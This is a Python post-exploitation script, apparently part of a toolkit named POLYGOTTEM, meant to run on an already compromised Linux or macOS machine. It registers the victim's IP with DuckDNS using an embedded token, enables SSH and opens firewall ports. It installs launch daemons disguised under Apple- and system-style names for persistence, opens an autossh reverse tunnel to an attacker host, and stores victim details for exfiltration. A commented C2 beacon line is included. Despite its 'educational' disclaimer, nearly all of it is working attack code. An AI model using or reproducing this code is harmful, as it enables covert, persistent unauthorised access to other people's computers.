#!/usr/bin/env python3
"""
POLYGOTTEM - Target DuckDNS Setup Script
=========================================
POST-EXPLOITATION SCRIPT - Deploy this to TARGET after initial compromise

This script runs ON THE COMPROMISED TARGET to:
1. Detect target's public IP
2. Register with DuckDNS (making target accessible via domain)
3. Enable SSH server on target
4. Configure firewall to allow SSH
5. Save connection info for exfiltration

EDUCATIONAL/RESEARCH USE ONLY - AUTHORIZED SECURITY TESTING ONLY

Author: SWORDIntel
Date: 2025-11-15
"""

import os
import sys
import socket
import subprocess
import json
import random
import time
import platform
from typing import Optional, Dict, Tuple
from datetime import datetime
from pathlib import Path

# Embedded DuckDNS credentials (for target registration)
DUCKDNS_DOMAIN = "polygottem.duckdns.org"
DUCKDNS_TOKEN = "62414348-fa36-4a8c-8fc2-8b96ef48b3ea"
DUCKDNS_UPDATE_URL = "https://www.duckdns.org/update"

# Configuration file (saved on target for persistence)
CONFIG_FILE = "/tmp/.polygottem_target_info.json"


def is_macos() -> bool:
    """Check if running on macOS"""
    return platform.system() == 'Darwin'


def validate_ip_address(ip: str) -> bool:
    """
    Validate IP address format

    Args:
        ip: IP address string to validate

    Returns:
        True if valid IPv4 or IPv6 address
    """
    try:
        # Try IPv4
        socket.inet_aton(ip)
        return True
    except socket.error:
        pass

    try:
        # Try IPv6
        socket.inet_pton(socket.AF_INET6, ip)
        return True
    except socket.error:
        pass

    return False


def verify_dns_resolution(domain: str, expected_ip: str) -> Tuple[bool, Optional[str]]:
    """
    Verify DNS resolution matches expected IP

    Args:
        domain: Domain to check
        expected_ip: Expected IP address

    Returns:
        Tuple of (success, resolved_ip)
    """
    try:
        # Wait for DNS propagation
        time.sleep(2)

        # Resolve domain
        resolved_ip = socket.gethostbyname(domain)

        # Compare IPs
        return (resolved_ip == expected_ip, resolved_ip)

    except socket.gaierror:
        return (False, None)
    except Exception:
        return (False, None)


def get_public_ip() -> Optional[str]:
    """
    Detect target's public IP address

    Returns:
        Public IP or None if detection fails
    """
    try:
        import requests
        services = [
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://icanhazip.com"
        ]

        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    return response.text.strip()
            except:
                continue
        return None
    except ImportError:
        # Fallback if requests not available
        try:
            import urllib.request
            with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
                return response.read().decode('utf-8').strip()
        except:
            return None


def update_duckdns(ip: str, verify: bool = True, max_retries: int = 3) -> bool:
    """
    Register target's IP with DuckDNS (with validation and verification)

    Args:
        ip: Target's public IP address
        verify: Verify DNS resolution after update
        max_retries: Number of retry attempts

    Returns:
        True if registration successful and verified
    """
    # Validate IP format
    if not validate_ip_address(ip):
        print(f"[!] Invalid IP format: {ip}")
        return False

    print(f"[*] Validated IP: {ip}")

    # Attempt update with retries
    for attempt in range(1, max_retries + 1):
        try:
            # Try with requests library
            import requests

            domain = DUCKDNS_DOMAIN.replace('.duckdns.org', '')
            params = {
                'domains': domain,
                'token': DUCKDNS_TOKEN,
                'ip': ip
            }

            print(f"[*] Sending update (attempt {attempt}/{max_retries})...")
            response = requests.get(DUCKDNS_UPDATE_URL, params=params, timeout=10)

            if response.status_code == 200:
                response_text = response.text.strip()

                if response_text == 'OK':
                    print(f"[+] DuckDNS API response: OK")

                    # Verify DNS resolution
                    if verify:
                        print(f"[*] Verifying DNS resolution...")
                        success, resolved_ip = verify_dns_resolution(DUCKDNS_DOMAIN, ip)

                        if success:
                            print(f"[+] DNS verified: {DUCKDNS_DOMAIN} → {resolved_ip}")
                            return True
                        else:
                            if resolved_ip:
                                print(f"[!] DNS mismatch: Expected {ip}, got {resolved_ip}")
                            else:
                                print(f"[!] DNS resolution pending - may take time to propagate")

                            # Still return True if API said OK
                            return True
                    else:
                        return True

                elif response_text == 'KO':
                    print(f"[!] DuckDNS API returned 'KO' (invalid token/domain)")
                    if attempt < max_retries:
                        time.sleep(5)
                        continue
                    return False
                else:
                    print(f"[!] Unexpected response: {response_text}")
                    if attempt < max_retries:
                        time.sleep(2)
                        continue
                    return False
            else:
                print(f"[!] HTTP {response.status_code}")
                if attempt < max_retries:
                    time.sleep(2)
                    continue
                return False

        except ImportError:
            # Fallback using curl if requests unavailable
            try:
                domain = DUCKDNS_DOMAIN.replace('.duckdns.org', '')
                url = f"{DUCKDNS_UPDATE_URL}?domains={domain}&token={DUCKDNS_TOKEN}&ip={ip}"

                print(f"[*] Using curl fallback (attempt {attempt}/{max_retries})...")
                result = subprocess.run(['curl', '-s', url], capture_output=True, text=True, timeout=10)

                if 'OK' in result.stdout:
                    print(f"[+] DuckDNS update successful")

                    # Verify DNS if requested
                    if verify:
                        success, resolved_ip = verify_dns_resolution(DUCKDNS_DOMAIN, ip)
                        if success:
                            print(f"[+] DNS verified: {DUCKDNS_DOMAIN} → {resolved_ip}")
                        else:
                            print(f"[!] DNS resolution pending")

                    return True
                else:
                    if attempt < max_retries:
                        time.sleep(2)
                        continue
                    return False

            except Exception as e:
                print(f"[!] Curl failed: {e}")
                if attempt < max_retries:
                    time.sleep(3)
                    continue
                return False

        except Exception as e:
            print(f"[!] Error: {e}")
            if attempt < max_retries:
                time.sleep(3)
                continue
            return False

    return False


def generate_random_port() -> int:
    """Generate random SSH port for security"""
    return random.randint(2000, 65000)


def enable_macos_remote_login() -> bool:
    """
    Enable macOS Remote Login (SSH)

    Returns:
        True if successful or already enabled
    """
    try:
        # Check if already enabled
        result = subprocess.run(
            ['sudo', 'systemsetup', '-getremotelogin'],
            capture_output=True,
            text=True,
            timeout=30
        )

        if 'On' in result.stdout:
            print("[+] Remote Login already enabled")
            return True

        # Enable Remote Login
        result = subprocess.run(
            ['sudo', 'systemsetup', '-setremotelogin', 'on'],
            capture_output=True,
            text=True,
            timeout=30
        )

        if result.returncode == 0:
            print("[+] Remote Login enabled")
            return True
        else:
            print(f"[!] Failed to enable Remote Login: {result.stderr}")
            return False

    except subprocess.TimeoutExpired:
        print("[!] Timeout enabling Remote Login")
        return False
    except Exception as e:
        print(f"[!] Error enabling Remote Login: {e}")
        return False


def install_macos_launchdaemon(ssh_port: int) -> bool:
    """
    Install LaunchDaemon for SSH keepalive persistence

    Args:
        ssh_port: SSH port to monitor

    Returns:
        True if successful
    """
    try:
        # Create keepalive script
        script_content = f'''#!/bin/bash
# SSH Keepalive for POLYGOTTEM
LOG="/var/log/ssh_keepalive.log"

echo "$(date): Checking SSH status..." >> "$LOG"

# Check if SSH is running
if ! sudo launchctl list | grep -q com.openssh.sshd; then
    echo "$(date): Starting SSH..." >> "$LOG"
    sudo systemsetup -setremotelogin on
fi

# Verify port {ssh_port}
if ! netstat -an | grep -q ":{ssh_port}.*LISTEN"; then
    echo "$(date): Warning - SSH not on port {ssh_port}" >> "$LOG"
fi
'''

        script_path = "/usr/local/bin/ssh_keepalive.sh"
        subprocess.run(
            ['sudo', 'tee', script_path],
            input=script_content.encode(),
            capture_output=True,
            check=True
        )
        subprocess.run(['sudo', 'chmod', '+x', script_path], check=True)

        # Create LaunchDaemon plist
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.sshkeepalive</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StandardOutPath</key>
    <string>/var/log/com.system.sshkeepalive.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/com.system.sshkeepalive.err</string>
    <key>ThrottleInterval</key>
    <integer>60</integer>
</dict>
</plist>'''

        plist_path = "/Library/LaunchDaemons/com.system.sshkeepalive.plist"
        subprocess.run(
            ['sudo', 'tee', plist_path],
            input=plist_content.encode(),
            capture_output=True,
            check=True
        )

        # Load LaunchDaemon
        subprocess.run(
            ['sudo', 'launchctl', 'load', '-w', plist_path],
            capture_output=True,
            check=True
        )

        print(f"[+] LaunchDaemon installed: {plist_path}")
        return True

    except Exception as e:
        print(f"[!] Failed to install LaunchDaemon: {e}")
        return False


def install_macos_launchagent() -> bool:
    """
    Install LaunchAgent for DuckDNS auto-update persistence

    Returns:
        True if successful
    """
    try:
        # Create update script
        script_content = f'''#!/bin/bash
# DuckDNS Auto-Update for POLYGOTTEM
IP=$(curl -s https://api.ipify.org)
curl -s "{DUCKDNS_UPDATE_URL}?domains={DUCKDNS_DOMAIN.replace('.duckdns.org', '')}&token={DUCKDNS_TOKEN}&ip=$IP" >> /tmp/duckdns_update.log
echo "$(date): Updated DuckDNS with IP $IP" >> /tmp/duckdns_update.log
'''

        script_path = os.path.expanduser("~/Library/Scripts/duckdns_update.sh")
        os.makedirs(os.path.dirname(script_path), exist_ok=True)

        with open(script_path, 'w') as f:
            f.write(script_content)
        os.chmod(script_path, 0o755)

        # Create LaunchAgent plist
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.dnsupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>StandardOutPath</key>
    <string>/tmp/com.apple.dnsupdate.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/com.apple.dnsupdate.err</string>
</dict>
</plist>'''

        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.dnsupdate.plist")
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)

        with open(plist_path, 'w') as f:
            f.write(plist_content)

        # Load LaunchAgent
        subprocess.run(
            ['launchctl', 'load', '-w', plist_path],
            capture_output=True,
            check=True
        )

        print(f"[+] LaunchAgent installed: {plist_path}")
        return True

    except Exception as e:
        print(f"[!] Failed to install LaunchAgent: {e}")
        return False


def setup_reverse_tunnel_macos(remote_host: str, remote_port: int, local_port: int) -> bool:
    """
    Setup persistent reverse SSH tunnel on macOS

    Args:
        remote_host: Remote server for tunnel
        remote_port: Remote port for reverse tunnel
        local_port: Local SSH port

    Returns:
        True if successful
    """
    try:
        # Create reverse tunnel script
        script_content = f'''#!/bin/bash
# Reverse SSH Tunnel for POLYGOTTEM
REMOTE_HOST="{remote_host}"
REMOTE_PORT={remote_port}
LOCAL_PORT={local_port}
LOG="/var/log/reverse_tunnel.log"

echo "$(date): Starting reverse tunnel..." >> "$LOG"

# Kill existing tunnels
pkill -f "autossh.*$REMOTE_PORT"

# Install autossh if needed
if ! command -v autossh &> /dev/null; then
    echo "$(date): Installing autossh..." >> "$LOG"
    brew install autossh >> "$LOG" 2>&1
fi

# Start tunnel
export AUTOSSH_POLL=60
autossh -M 20000 -f -N \\
    -o "ServerAliveInterval=30" \\
    -o "ServerAliveCountMax=3" \\
    -o "StrictHostKeyChecking=no" \\
    -R $REMOTE_PORT:localhost:$LOCAL_PORT \\
    tunnel@$REMOTE_HOST >> "$LOG" 2>&1

echo "$(date): Reverse tunnel established" >> "$LOG"
'''

        script_path = "/usr/local/bin/reverse_tunnel.sh"
        subprocess.run(
            ['sudo', 'tee', script_path],
            input=script_content.encode(),
            capture_output=True,
            check=True
        )
        subprocess.run(['sudo', 'chmod', '+x', script_path], check=True)

        # Create LaunchDaemon for tunnel
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.networktunnel</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StandardOutPath</key>
    <string>/var/log/com.system.networktunnel.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/com.system.networktunnel.err</string>
</dict>
</plist>'''

        plist_path = "/Library/LaunchDaemons/com.system.networktunnel.plist"
        subprocess.run(
            ['sudo', 'tee', plist_path],
            input=plist_content.encode(),
            capture_output=True,
            check=True
        )

        # Load LaunchDaemon
        subprocess.run(
            ['sudo', 'launchctl', 'load', '-w', plist_path],
            capture_output=True,
            check=True
        )

        print(f"[+] Reverse tunnel LaunchDaemon installed")
        print(f"    Tunnel: {remote_host}:{remote_port} -> localhost:{local_port}")
        return True

    except Exception as e:
        print(f"[!] Failed to setup reverse tunnel: {e}")
        return False


def enable_ssh_server(port: int = 22) -> bool:
    """
    Enable and start SSH server on target

    Args:
        port: SSH port to use

    Returns:
        True if SSH is running
    """
    try:
        # macOS-specific SSH handling
        if is_macos():
            return enable_macos_remote_login()

        # Linux SSH handling
        # Check if SSH already running
        for service in ['ssh', 'sshd']:
            result = subprocess.run(
                ['systemctl', 'is-active', service],
                capture_output=True,
                text=True
            )
            if result.returncode == 0 and result.stdout.strip() == 'active':
                return True

        # Try to start SSH server
        for service in ['ssh', 'sshd']:
            try:
                subprocess.run(
                    ['systemctl', 'start', service],
                    check=True,
                    capture_output=True
                )
                # Enable on boot
                subprocess.run(
                    ['systemctl', 'enable', service],
                    capture_output=True
                )
                return True
            except:
                continue

        return False
    except:
        return False


def configure_firewall(port: int = 22) -> bool:
    """
    Configure firewall to allow SSH connections

    Args:
        port: SSH port to open

    Returns:
        True if successful
    """
    try:
        # Try ufw (Ubuntu/Debian)
        result = subprocess.run(['which', 'ufw'], capture_output=True)
        if result.returncode == 0:
            subprocess.run(['ufw', 'allow', f'{port}/tcp'], capture_output=True)
            subprocess.run(['ufw', '--force', 'enable'], capture_output=True)
            return True

        # Try firewall-cmd (RHEL/Fedora)
        result = subprocess.run(['which', 'firewall-cmd'], capture_output=True)
        if result.returncode == 0:
            if port == 22:
                subprocess.run(
                    ['firewall-cmd', '--add-service=ssh', '--permanent'],
                    capture_output=True
                )
            else:
                subprocess.run(
                    ['firewall-cmd', f'--add-port={port}/tcp', '--permanent'],
                    capture_output=True
                )
            subprocess.run(['firewall-cmd', '--reload'], capture_output=True)
            return True

        # Try iptables (fallback)
        result = subprocess.run(['which', 'iptables'], capture_output=True)
        if result.returncode == 0:
            subprocess.run(
                ['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', str(port), '-j', 'ACCEPT'],
                capture_output=True
            )
            return True

        return False
    except:
        return False


def get_hostname() -> str:
    """Get target hostname"""
    try:
        return socket.gethostname()
    except:
        return "unknown"


def get_username() -> str:
    """Get current username"""
    try:
        return os.getenv('USER', os.getenv('USERNAME', 'unknown'))
    except:
        return "unknown"


def save_connection_info(info: Dict) -> bool:
    """
    Save connection information to file for exfiltration

    Args:
        info: Connection information dictionary

    Returns:
        True if successful
    """
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(info, f, indent=2)
        # Make file hidden and readable by all (for exfiltration)
        os.chmod(CONFIG_FILE, 0o644)
        return True
    except:
        return False


def send_beacon(info: Dict) -> bool:
    """
    Send connection info back to attacker (implement your C2 here)

    This is a placeholder - implement your preferred method:
    - HTTP POST to C2 server
    - DNS exfiltration
    - Email beacon
    - etc.

    Args:
        info: Connection information

    Returns:
        True if beacon sent successfully
    """
    try:
        # Example: HTTP POST to C2 server
        # import requests
        # response = requests.post('http://your-c2-server.com/beacon', json=info, timeout=5)
        # return response.status_code == 200

        # For now, just save to file
        return save_connection_info(info)
    except:
        return False


def main():
    """Main setup workflow"""
    import argparse

    parser = argparse.ArgumentParser(
        description="POLYGOTTEM Target DuckDNS Setup - Deploy on compromised target"
    )
    parser.add_argument(
        '--install-macos-persistence',
        action='store_true',
        help='Install macOS LaunchDaemons and LaunchAgents for persistence'
    )
    parser.add_argument(
        '--tunnel-host',
        type=str,
        help='Remote host for reverse SSH tunnel (NAT/firewall bypass)'
    )
    parser.add_argument(
        '--tunnel-port',
        type=int,
        default=2222,
        help='Remote port for reverse tunnel (default: 2222)'
    )

    args = parser.parse_args()

    print("=" * 70)
    print("POLYGOTTEM Target DuckDNS Setup")
    print("=" * 70)
    print(f"Platform: {platform.system()} ({sys.platform})")
    print()

    # Use random port for security
    ssh_port = generate_random_port()
    print(f"[*] Using SSH port: {ssh_port}")

    # Determine total steps
    base_steps = 5
    macos_steps = 0
    if is_macos() and args.install_macos_persistence:
        macos_steps = 3 if args.tunnel_host else 2

    total_steps = base_steps + macos_steps
    current_step = 1

    # Step 1: Detect public IP
    print(f"[{current_step}/{total_steps}] Detecting target public IP...")
    public_ip = get_public_ip()
    if not public_ip:
        print("[!] Failed to detect public IP - trying anyway...")
        public_ip = "unknown"
    else:
        print(f"[+] Public IP: {public_ip}")
    print()
    current_step += 1

    # Step 2: Register with DuckDNS
    print(f"[{current_step}/{total_steps}] Registering with DuckDNS...")
    if update_duckdns(public_ip):
        print(f"[+] DuckDNS updated: {DUCKDNS_DOMAIN} → {public_ip}")
    else:
        print("[!] DuckDNS update failed (continuing anyway)")
    print()
    current_step += 1

    # Step 3: Enable SSH server
    print(f"[{current_step}/{total_steps}] Enabling SSH server...")
    if enable_ssh_server(ssh_port):
        print("[+] SSH server is running")
    else:
        print("[!] Failed to enable SSH server")
    print()
    current_step += 1

    # Step 4: Configure firewall
    print(f"[{current_step}/{total_steps}] Configuring firewall...")
    if configure_firewall(ssh_port):
        print(f"[+] Firewall configured (port {ssh_port} open)")
    else:
        print("[!] Firewall configuration failed")
    print()
    current_step += 1

    # macOS-specific persistence (if requested)
    if is_macos() and args.install_macos_persistence:
        print(f"[{current_step}/{total_steps}] Installing macOS SSH keepalive LaunchDaemon...")
        install_macos_launchdaemon(ssh_port)
        print()
        current_step += 1

        print(f"[{current_step}/{total_steps}] Installing macOS DuckDNS LaunchAgent...")
        install_macos_launchagent()
        print()
        current_step += 1

        if args.tunnel_host:
            print(f"[{current_step}/{total_steps}] Installing reverse SSH tunnel...")
            setup_reverse_tunnel_macos(args.tunnel_host, args.tunnel_port, ssh_port)
            print()
            current_step += 1

    # Step 5: Save connection info
    print(f"[{current_step}/{total_steps}] Saving connection information...")
    connection_info = {
        'domain': DUCKDNS_DOMAIN,
        'public_ip': public_ip,
        'ssh_port': ssh_port,
        'username': get_username(),
        'hostname': get_hostname(),
        'connection_string': f"ssh -p {ssh_port} {get_username()}@{DUCKDNS_DOMAIN}",
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'platform': sys.platform,
        'macos_persistence': is_macos() and args.install_macos_persistence,
        'reverse_tunnel': args.tunnel_host if args.tunnel_host else None
    }

    if save_connection_info(connection_info):
        print(f"[+] Connection info saved to {CONFIG_FILE}")

    # Send beacon to C2
    if send_beacon(connection_info):
        print("[+] Beacon sent to C2")
    print()

    # Display connection info
    print("=" * 70)
    print("TARGET CONNECTION INFORMATION")
    print("=" * 70)
    print(f"Domain:      {DUCKDNS_DOMAIN}")
    print(f"Public IP:   {public_ip}")
    print(f"SSH Port:    {ssh_port}")
    print(f"Username:    {get_username()}")
    print(f"Hostname:    {get_hostname()}")
    print(f"Platform:    {platform.system()}")

    if is_macos() and args.install_macos_persistence:
        print(f"Persistence: macOS LaunchDaemons + LaunchAgents installed")

    if args.tunnel_host:
        print(f"Tunnel:      {args.tunnel_host}:{args.tunnel_port} -> localhost:{ssh_port}")

    print()
    print(f"Connect with: {connection_info['connection_string']}")
    print()
    print("=" * 70)
    print()

    # Port forwarding instructions (if behind NAT and no tunnel)
    if not args.tunnel_host:
        print("IMPORTANT: If target is behind NAT/router, configure port forwarding:")
        print(f"  External Port {ssh_port} → Internal IP:{ssh_port}")
        print()
        print("OR use reverse tunnel:")
        print(f"  python3 {sys.argv[0]} --tunnel-host <your-server> --install-macos-persistence")
        print()

    print(f"Connection info saved to: {CONFIG_FILE}")
    print("Exfiltrate this file to obtain access credentials")
    print()

    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
